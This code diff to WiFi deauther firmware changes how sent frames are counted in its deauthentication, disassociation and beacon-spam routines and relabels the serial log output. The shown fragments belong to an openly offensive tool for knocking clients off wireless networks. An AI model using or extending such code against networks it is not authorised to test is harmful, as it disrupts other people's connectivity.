@@ -18,6 +18,7 @@ extern "C"
 
 bool deautherRunning = false;
 unsigned long deautherPacketsSent = 0;
+unsigned long deautherTmpPacketRate = 0;
 unsigned long deautherInjectFail = 0;
 bool beaconActive = false;
 unsigned long beaconPacketsSent = 0;
@@ -79,7 +80,7 @@ static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch
   const bool sent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
   if (sent)
   {
-    deautherPacketsSent++;
+    deautherTmpPacketRate++;
   }
   else
   {
@@ -126,6 +127,7 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
   if (sendPacketSpacehuhn(deauthpkt, packetSize, ch, true))
   {
     success = true;
+    deautherPacketsSent++;
   }
 
   uint8_t disassocpkt[packetSize];
@@ -134,6 +136,7 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
   if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
   {
     success = true;
+    deautherPacketsSent++;
   }
 
   if (!macBroadcast(stMac))
@@ -146,12 +149,14 @@ static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason
     if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
+      deautherPacketsSent++;
     }
 
     disassocpkt[0] = 0xa0;
     if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
+      deautherPacketsSent++;
     }
   }
 
@@ -225,6 +230,7 @@ static uint8_t beaconPacket[128] = {
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
 {
   deautherPacketsSent = 0;
+  deautherTmpPacketRate = 0;
   deautherInjectFail = 0;
 
   memcpy(targetApMac, apMac, 6);
@@ -243,8 +249,10 @@ void stopDeauthAttack()
   attackActive = false;
   deautherRunning = false;
 
-  Serial.print(F("[deauther] OK="));
+  Serial.print(F("[deauther] deauthFrames="));
   Serial.print(deautherPacketsSent);
+  Serial.print(F(" tmpPacketRate="));
+  Serial.print(deautherTmpPacketRate);
   Serial.print(F(" falha="));
   Serial.println(deautherInjectFail);
 
@@ -294,7 +302,10 @@ void updateBeacon()
 
       setWifiChannelSh(beaconPacket[56], true);
       delay(1);
-      wifi_send_pkt_freedom(beaconPacket, 109, 0);
+      if (wifi_send_pkt_freedom(beaconPacket, 109, 0) == 0)
+      {
+        deautherTmpPacketRate++;
+      }
       beaconPacketsSent++;
     }
     lastBeaconTickAt = millis();
